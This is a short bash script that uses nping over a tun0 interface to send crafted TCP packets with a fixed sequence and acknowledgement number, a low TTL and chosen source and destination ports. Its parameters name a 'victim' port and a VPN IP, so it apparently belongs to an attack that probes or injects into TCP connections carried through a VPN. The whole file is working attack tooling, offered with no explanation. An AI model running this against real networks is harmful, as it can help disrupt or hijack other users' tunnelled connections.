#!/bin/bash
VPNPORT=$1
VICTIMPORT=$2
VPNIP=$3

sudo nping  -e tun0 -c 5 --ttl 2  --tcp  -g $VPNPORT -p $VICTIMPORT -seq 12345 -ack 12345 $VPNIP
